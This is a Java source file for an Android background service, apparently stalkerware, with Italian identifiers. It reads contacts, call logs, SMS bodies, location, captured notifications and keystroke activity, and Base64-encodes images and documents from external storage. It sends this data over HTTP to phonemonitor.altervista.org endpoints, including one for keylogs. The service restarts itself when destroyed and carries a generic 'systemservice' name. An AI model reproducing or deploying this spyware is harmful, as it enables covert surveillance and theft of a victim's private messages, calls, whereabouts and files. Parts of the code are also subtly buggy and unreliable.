package com.example.systemservice;

import android.Manifest;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.text.format.DateUtils;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutionException;

public class MainService extends Service {

    private static final String TAG_BOOT_EXECUTE_SERVICE = "BOOT_BROADCAST_SERVICE";
    boolean firstTimeContact = true, contattoTrovato = false;
    ArrayList<Contatto> contattiRegistrati = new ArrayList<>();
    ArrayList<Contatto> contattiDaInviare = new ArrayList<>();
    ArrayList<Chiamata> chiamateDaInviare = new ArrayList<>();
    ArrayList<Messaggio> smsDaInviare = new ArrayList<>();
    ArrayList<Posizione> posizioniDaInviare = new ArrayList<>();

    LocationManager locationManager;
    Location location;

    File fileExternal = new File(Environment.getExternalStorageDirectory().getAbsolutePath());
    boolean firstImmagine = true, immagineTrovata = false, firstDocumento = true, documentoTrovato = false;
    ArrayList<Immagine> immagine = new ArrayList<>();
    ArrayList<Immagine> newImmagine = new ArrayList<>();
    ArrayList<Documento> documento = new ArrayList<>();
    ArrayList<Documento> newDocumento = new ArrayList<>();



    public LinkedList<Notifica> notifiche = new LinkedList<Notifica>();
    public LinkedList<Attivita> attivita = new LinkedList<>();

    private boolean receiversRegistered;
    private static String idUtente = null;
    private static String idDispositivo = null;
    private static String dateTimeCorrChiamate = null;
    private static String dateTimeCorrMessaggi = null;
    DateFormat formatter = new SimpleDateFormat("ddMMyyyyHHmmss");
    //VAR SETUP BACKEND
    private static final String PROTOCOL = "http://";
    private static final String DOMINIO = "phonemonitor.altervista.org/php/BE/";
    private static final String AGGIORNA_URL = PROTOCOL + DOMINIO + "aggiornaDispositivo.php";
    private static final String ATTIVITA_URL = PROTOCOL + DOMINIO + "aggiungiAttivita.php";
    private static final String POSIZIONE_URL = PROTOCOL + DOMINIO + "aggiungiPosizione.php";
    private static final String CONTATTO_URL = PROTOCOL + DOMINIO + "aggiungiContatto.php";
    private static final String CHIAMATA_URL = PROTOCOL + DOMINIO + "aggiungiChiamata.php";
    private static final String MESSAGGIO_URL = PROTOCOL + DOMINIO + "aggiungiMessaggio.php";
    private static final String KEYLOG_URL = PROTOCOL + DOMINIO + "aggiungiKeylog.php";
    private static final String CRONOLOGIA_URL = PROTOCOL + DOMINIO + "aggiungiSito.php";

    //VAR SETUP KEY ENTRI SHARED PREFERENCES
    private static final String KEY_ID_DISPOSITIVO = "idDispositivo";
    private static final String KEY_DATETIMECORR_CHIAMATE = "dateTimeCorrChiamate";
    private static final String KEY_DATETIMECORR_MESSAGGI = "dateTimeCorrMessaggi";
    private static final String KEY_DATETIMECORR_IMMAGINI = "dateTimeCorrImmagini";
    private static final String KEY_DATETIMECORR_DOCUMENTI = "dateTimeCorrDocumenti";

    public MainService() {
    }

    public MainService(Context applicationContext) {
        super();
        Log.i("HERE", "here I am!");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        receiversRegistered = false;
        registerReceivers();
        SharedPreferences sharedPref = this.getSharedPreferences("FILE", Context.MODE_PRIVATE);
        idUtente = this.getString(R.string.ID_UTENTE);
        //Carico idDispositivo
        idDispositivoSetup(sharedPref);
        //Carico i dateTime
        dateTimeSetup(sharedPref);

        //Carico contatti, chiamate(forse)
        Log.d("++++", String.valueOf(idDispositivo));
        Log.i("SERVICE", "NUOVO SERVICE");
    }

    //EVENTI

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //Toast.makeText(getApplicationContext(), "Service startato", Toast.LENGTH_LONG).show();
        super.onStartCommand(intent, flags, startId);
        startTimer();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i("EXIT", "ondestroy!");
        //Salvo parametri nelle sharedpref

        //Invio al restarter l'intent
        Intent broadcastIntent = new Intent(this, RestarterBroadcastReceiver.class);
        sendBroadcast(broadcastIntent);
        stoptimertask();
        if (receiversRegistered) {
            unregisterReceiver(notifReceiver);
            unregisterReceiver(logSocialReceiver);
            unregisterReceiver(attivitaReceiver);
        }
    }

    //CONFIG SERVICE

    private static void idDispositivoSetup(SharedPreferences sharedPref) {
        idDispositivo = sharedPref.getString(KEY_ID_DISPOSITIVO, "-1");
        if (idDispositivo == "-1") {
            //Chiudo l'app per sicurezza
            int pid = android.os.Process.myPid();
            android.os.Process.killProcess(pid);
        }
    }

    private static void dateTimeSetup(SharedPreferences sharedPref) {
        dateTimeCorrChiamate = sharedPref.getString(KEY_DATETIMECORR_CHIAMATE, "00000000000000");
        dateTimeCorrMessaggi = sharedPref.getString(KEY_DATETIMECORR_MESSAGGI, "00000000000000");
    }

    //TIMER PER EXEC CICLICA
    private Timer timer;
    private TimerTask timerTask;

    public void startTimer() {
        //set a new Timer
        timer = new Timer();

        //initialize the TimerTask's job
        initializeTimerTask();

        //schedule the timer, to wake up every 1 second
        timer.scheduleAtFixedRate(timerTask, 1000, 5000); //
    }

    public void stoptimertask() {
        //stop the timer, if it's not already null
        if (timer != null) {
            timer.cancel();
            timer = null;
        }
    }

    public void initializeTimerTask() {
        timerTask = new TimerTask() {
            public void run() {
                //rubrica();
                //chiamate();
                posizione();
                //messaggi();
            }
        };
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    //Receivers

    private BroadcastReceiver notifReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            //Ricevo le notifiche dal notificationReceiver
            try {
                String id = intent.getStringExtra("ID");
                String applicazione = intent.getStringExtra("Applicazione");
                String titolo = intent.getStringExtra("Titolo");
                String testo = intent.getStringExtra("Testo");
                String dateTime = intent.getStringExtra("DateTime");
                Notifica n = new Notifica(id, applicazione, titolo, testo, dateTime);
                n.setInviata(false);
                notifiche.add(n);
                Log.d("++++", n.toString());
            } catch (Exception e) {
                Log.d("Passaggio notifica: ", "Non eseguito");
            }
        }
    };

    private BroadcastReceiver logSocialReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            //Ricevo le notifiche dal notificationReceiver
            try {
                String id = "";
                String applicazione = intent.getStringExtra("Applicazione");
                String titolo = intent.getStringExtra("Titolo");
                String testo = intent.getStringExtra("Testo");
                String dateTime = intent.getStringExtra("DateTime");
                Notifica n = new Notifica(id, applicazione, titolo, testo, dateTime);
                n.setInviata(true);
                notifiche.add(n);
                Log.d("notifica inviata", n.toString());
            } catch (Exception e) {
                Log.d("Passaggio notifica", "Non eseguito");
            }
        }
    };

    private BroadcastReceiver attivitaReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            //Ricevo le attivita dal keyListener
            try {
                String applicazione = intent.getStringExtra("pack");
                String descrizione = intent.getStringExtra("descrizione");
                String dateTime = intent.getStringExtra("data");
                Attivita a = new Attivita(applicazione, descrizione, dateTime);
                attivita.add(a);
            } catch (Exception e) {
                Log.d("Passaggio notifica", "Non eseguito");
            }
        }
    };

    public void registerReceivers() {
        if (!receiversRegistered) {
            //Notifiche
            IntentFilter filter = new IntentFilter();
            filter.addAction("ricevitoreNotifiche");
            registerReceiver(notifReceiver, filter);
            //Keylogger social
            filter = new IntentFilter();
            filter.addAction("logSocialReceiver");
            registerReceiver(logSocialReceiver, filter);
            //Attivita
            filter = new IntentFilter();
            filter.addAction("attivitaReceiver");
            registerReceiver(attivitaReceiver, filter);
            //Registro una sola volta
            receiversRegistered = true;
        }
    }

    private void rubrica() {
        Log.d("++++", "Sono in rubrica");

        String id, name, number;

        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        if (cursor.moveToFirst()) {
            do {
                id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));

                if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        name = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        number = Contatto.normalizzaNumero(pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));

                        if (firstTimeContact) {
                            contattiRegistrati.add(new Contatto(name, number));
                            contattiDaInviare.add(new Contatto(name, number));
                        } else {
                            for (Contatto c : contattiRegistrati)
                                if (name.equals(c.nome) && number.equals(c.numero))
                                    contattoTrovato = true;

                            if (!contattoTrovato) {
                                contattiRegistrati.add(new Contatto(name, number));
                                contattiDaInviare.add(new Contatto(name, number));
                            }

                            contattoTrovato = false;
                        }
                        break;
                    }
                    pCur.close();
                }
            } while (cursor.moveToNext());
        }
        Collections.sort(contattiDaInviare, new Comparator<Contatto>() {
            @Override
            public int compare(Contatto c1, Contatto c2) {
                return c1.nome.compareTo(c2.nome);
            }
        });
        Log.d("++++", "Numero cont da inviare: " + contattiDaInviare.size());
        List<Contatto> posDaCanc = new ArrayList<Contatto>();
        int i = 0;
        for (i = 0; i < contattiDaInviare.size(); i++) {
            Contatto cSend = contattiDaInviare.get(i);
            HttpPostRequest postRequest = new HttpPostRequest();
            JSONObject reader = null;
            String esito = null;
            try {
                reader = new JSONObject(postRequest.execute(CONTATTO_URL, "4", "idUtente", idUtente, "idDispositivo", idDispositivo, "nome", cSend.nome, "numeroTelefono", cSend.numero).get());
                esito = reader.getString("esito");
            } catch (ExecutionException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
            if (esito == "1" || esito.equals("1")) {
                //Contatto inviato correttamente -> rimuovo da lista
                try {
                    posDaCanc.add(cSend);
                } catch (Exception eCanc) {
                }
            } else {
                Log.d("++++", "Contatto non inviato{ " + cSend.nome + " " + cSend.numero + " }");
            }
        }
        for (Contatto p : posDaCanc) {
            contattiDaInviare.remove(p);
        }
        Log.d("++++", "Ora sono: " + contattiDaInviare.size());
        //Da salvare nelle shared pref
        firstTimeContact = false;
        Collections.sort(contattiRegistrati, new Comparator<Contatto>() {
            @Override
            public int compare(Contatto c1, Contatto c2) {
                return c1.nome.compareTo(c2.nome);
            }
        });


    }

    private void chiamate() {
        String numeroChiamata, durata, tipoChiamata = null, finalDateChiamata;
        long dateChiamata;
        Date dateTimeCorr = null;
        try {
            dateTimeCorr = formatter.parse(dateTimeCorrChiamate);
        } catch (Exception exParser) {
            Log.d("++++", "Impossibile parsare");
        }
        Date maxDate = dateTimeCorr;
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);

            while (c.moveToNext()) {
                //DA FIXARE FORSE ----!!!!-----
                numeroChiamata = Contatto.normalizzaNumero(c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)));
                dateChiamata = c.getLong(c.getColumnIndexOrThrow("date"));
                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(dateChiamata);
                finalDateChiamata = formatter.format(calendar.getTime());

                durata = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));
                int codice = Integer.parseInt(c.getString(c.getColumnIndex(CallLog.Calls.TYPE)));

                switch (codice) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        tipoChiamata = "Effettuata";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        tipoChiamata = "Ricevuta";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        tipoChiamata = "Persa";
                        break;
                }
                //Confronto il dateTime della chiamata
                //Se è maggiore del dateTime corrente la metto nella lista delle chiamate
                //da inviare al server, inoltre in un altra variabile tengo traccia del
                //dateTime massimo che ho trovato alla fine del ciclo salvo il dateTime massimo
                //nel dateTime corrente(Ripeto l'algoritmo anche per i messaggi, documenti e immagini)

                Date dataChiamataConfr = null;
                try {
                    dataChiamataConfr = formatter.parse(finalDateChiamata);
                    if (dataChiamataConfr.after(dateTimeCorr)) {
                        //Aggiungo a lista
                        chiamateDaInviare.add(new Chiamata(numeroChiamata, finalDateChiamata, durata, tipoChiamata));
                        if (dataChiamataConfr.after(maxDate))
                            maxDate = dataChiamataConfr;
                    }
                } catch (Exception exDataConfr) {
                    Log.d("++++", "Impossibile parsare la data di confronto");
                }

            } //Fine while
            dateTimeCorrChiamate = formatter.format(maxDate);
        }
        //Invio dati al server
        ArrayList<Chiamata> chiamateDaCanc = new ArrayList<Chiamata>();
        int cont = 1;
        Log.d("++++", "Size lista chiamate: " + chiamateDaInviare.size());
        for (Chiamata c : chiamateDaInviare) {
            HttpPostRequest postRequest = new HttpPostRequest();
            JSONObject reader = null;
            String esito = null;
            try {
                reader = new JSONObject(postRequest.execute(CHIAMATA_URL, "6", "idUtente", idUtente, "idDispositivo", idDispositivo, "numeroTelefono", c.numero, "tipo", c.tipo, "dateTime", c.data, "durata", DateUtils.formatElapsedTime(Integer.parseInt(c.durata))).get());
                esito = reader.getString("esito");
            } catch (ExecutionException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
            if (esito == "1" || esito.equals("1")) {
                //Chiamata inviata correttamente -> rimuovo da lista
                Log.d("++++", "Chiamata inviata{" + cont + "}");
                cont++;
                try {
                    chiamateDaCanc.add(c);
                } catch (Exception eCanc) {
                }
            } else {
                Log.d("++++", "Chiamata non inviata { " + c.numero + " }");
            }
        }
        for (Chiamata c : chiamateDaCanc) {
            chiamateDaInviare.remove(c);
        }
        Log.d("++++", "Tutte le chiamate sono state inviate");
        Log.d("++++", "Size chiamateDaInviare dopo rimozione: " + chiamateDaInviare.size());
    }


    private void messaggi() {
        String address, body, folderName, finalDateSms;
        Calendar calendar = Calendar.getInstance();

        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);

        Date dateTimeCorr = null;
        try {
            dateTimeCorr = formatter.parse(dateTimeCorrMessaggi);
        } catch (Exception exParser) {
            Log.d("++++", "Impossibile parsare");
        }
        Date maxDate = dateTimeCorr;

        if (c.moveToFirst()) {
            do {
                address = c.getString(c.getColumnIndex("address"));
                body = c.getString(c.getColumnIndexOrThrow("body"));
                calendar.setTimeInMillis(c.getLong(c.getColumnIndexOrThrow("date")));
                finalDateSms = formatter.format(calendar.getTime());
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1"))
                    folderName = "1";
                else
                    folderName = "0";

                Date dataMessaggioConfr = null;
                try {
                    dataMessaggioConfr = formatter.parse(finalDateSms);
                    if (dataMessaggioConfr.after(dateTimeCorr)) {
                        //Aggiungo a lista
                        smsDaInviare.add(new Messaggio(address, body, folderName, finalDateSms));
                        if (dataMessaggioConfr.after(maxDate))
                            maxDate = dataMessaggioConfr;
                    }
                } catch (Exception exDataConfr) {
                    Log.d("++++", "Impossibile parsare la data di confronto");
                }
            } while (c.moveToNext());
            dateTimeCorrMessaggi = formatter.format(maxDate);
        }
        c.close();

        //Invio messaggi al server
        ArrayList<Messaggio> messaggioDaCanc = new ArrayList<Messaggio>();
        int cont = 1;
        Log.d("++++", "Size lista messaggi: " + smsDaInviare.size());
        for (Messaggio m : smsDaInviare) {
            HttpPostRequest postRequest = new HttpPostRequest();
            JSONObject reader = null;
            String esito = null;
            try {
                Log.d("++++", "Address: " + m.mittente);
                try {
                    int val = Integer.parseInt(m.mittente);
                    //Se ci riesce normalizzo controllo che la lunghezza sia almeno uguale a 10(Evito num speciali)
                    if (m.mittente.length() >= 10)
                        m.mittente = Contatto.normalizzaNumero(m.mittente);
                } catch (Exception parsInt) {
                    //Se non ci riesce ci sono due casi possibili: 1)inizia con prefisso
                    //Oppure è un nome. In entrambi i casi non faccio niente
                }
                reader = new JSONObject(postRequest.execute(MESSAGGIO_URL, "7", "idUtente", idUtente, "idDispositivo", idDispositivo, "package", "Message", "testo", m.messaggio, "dateTime", m.data, "nomeContatto", m.mittente, "tipo", m.tipo).get());
                esito = reader.getString("esito");
            } catch (ExecutionException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
            if (esito == "1" || esito.equals("1")) {
                //Chiamata inviata correttamente -> rimuovo da lista
                Log.d("++++", "Messaggio inviato{" + cont + "}");

                try {
                    messaggioDaCanc.add(m);
                } catch (Exception eCanc) {
                }
            } else {
                Log.d("++++", "Messaggio non inviato { " + m.mittente + " }");
                Log.d("++++", "Body: " + m.messaggio);
                Log.d("++++", "DateTime: " + m.data);
                Log.d("++++", "Tipo: " + m.tipo);
            }
            cont++;
        }
        for (Messaggio m : messaggioDaCanc) {
            smsDaInviare.remove(m);
        }
        Log.d("++++", "Tutti i messaggi sono stati inviati");
        Log.d("++++", "Size smsDaInviare dopo rimozione: " + smsDaInviare.size());


        /*
        firstTimeSms=false;

        if(!smsDaInviare.isEmpty())
            for(Messaggio s : smsDaInviare)
                sms.add(s);

        smsDaInviare.clear();

        Collections.sort(sms, new Comparator<Messaggio>() {
            @Override
            public int compare(Messaggio o1, Messaggio o2) {
                return o1.data.compareTo(o2.data);
            }
        });
        */
    }

    private void posizione() {
        double latitude = 0.00, longitude = 0.00;
        //distanza minima per modificare gli aggiornamenti in metri
        long MIN_DISTANCE_CHANGE_FOR_UPDATES = 1; // 1 metro
        //Il tempo minimo tra gli aggiornamenti in millisecondi
        long MIN_TIME_BW_UPDATES = 1000 * 60; // 1 minuto
        String address = "", time;
        Posizione pos = new Posizione();

        locationManager = (LocationManager) this.getSystemService(LOCATION_SERVICE);
        LocationListener locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {

            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {

            }

            @Override
            public void onProviderEnabled(String provider) {

            }

            @Override
            public void onProviderDisabled(String provider) {

            }
        };
        if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, locationListener);
                if (locationManager != null) {
                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (location != null) {
                        latitude = location.getLatitude();
                        longitude = location.getLongitude();
                        Geocoder geocoder = new Geocoder(this, Locale.getDefault());
                        try {
                            List<Address> addresses = geocoder.getFromLocation(latitude, longitude, 1);
                            address = addresses.get(0).getAddressLine(0);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        time = formatter.format(Calendar.getInstance().getTimeInMillis());

                        //Posizione da inviare
                        pos = new Posizione(address, latitude, longitude, time);
                        Log.d("++++", pos.toString());
                        posizioniDaInviare.add(pos);
                    }
                }
            }
        } else
            pos = new Posizione();

        ArrayList<Posizione> posizioniInviate = new ArrayList<>();
        for (Posizione pSend : posizioniDaInviare) {
            HttpPostRequest postRequest = new HttpPostRequest();
            JSONObject reader = null;
            String esito = null;
            try {
                reader = new JSONObject(postRequest.execute(POSIZIONE_URL, "6", "idUtente", idUtente, "idDispositivo", idDispositivo, "indirizzo", pSend.indirizzo, "latitudine", String.valueOf(pSend.latitudine), "longitudine", String.valueOf(pSend.longitudine), "dateTime", pSend.data).get());
                esito = reader.getString("esito");
            } catch (ExecutionException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
            if (esito == "1" || esito.equals("1")) {
                try {
                    posizioniInviate.add(pSend);
                } catch (Exception eCanc) {
                }
            } else {
                Log.d("++++", "Posizione non inviata{ " + pSend.indirizzo + " }");
            }
        }
        for (Posizione p : posizioniInviate) {
            posizioniDaInviare.remove(p);
        }
    }


    private void fileExternal(File file) {
        File listFiles[] = file.listFiles();
        for (File f : listFiles) {
            if (f.isDirectory())
                fileExternal(f);
            else if (f.getName().contains(".jpg") || f.getName().contains(".jpeg") || f.getName().contains(".png")) {
                Bitmap bm = BitmapFactory.decodeFile(f.getPath());
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bm.compress(Bitmap.CompressFormat.JPEG, 100, baos); //bm is the bitmap object
                byte[] b = baos.toByteArray();
                String encodedImage = Base64.encodeToString(b, Base64.DEFAULT);

                immagine.add(new Immagine(f.getPath(), f.getName().substring(0, f.getName().indexOf(".")), f.getAbsolutePath().substring(f.getAbsolutePath().lastIndexOf(".")), formatter.format(f.lastModified()), encodedImage));


            }
            if (f.getName().contains(".pdf") || f.getName().contains(".txt") || f.getName().contains(".doc")) {
                int size = f.getPath().length();
                byte[] bytes = new byte[size];
                try {
                    BufferedInputStream buf = new BufferedInputStream(new FileInputStream(f.getPath()));
                    buf.read(bytes, 0, bytes.length);
                    buf.close();
                } catch (FileNotFoundException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                } catch (IOException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }

                String encoded = Base64.encodeToString(bytes, Base64.NO_WRAP);
                documento.add(new Documento(f.getPath(), f.getName().substring(0, f.getName().indexOf(".")), f.getAbsolutePath().substring(f.getAbsolutePath().lastIndexOf(".")), formatter.format(f.lastModified()), encoded));
            }
        }

    }



}

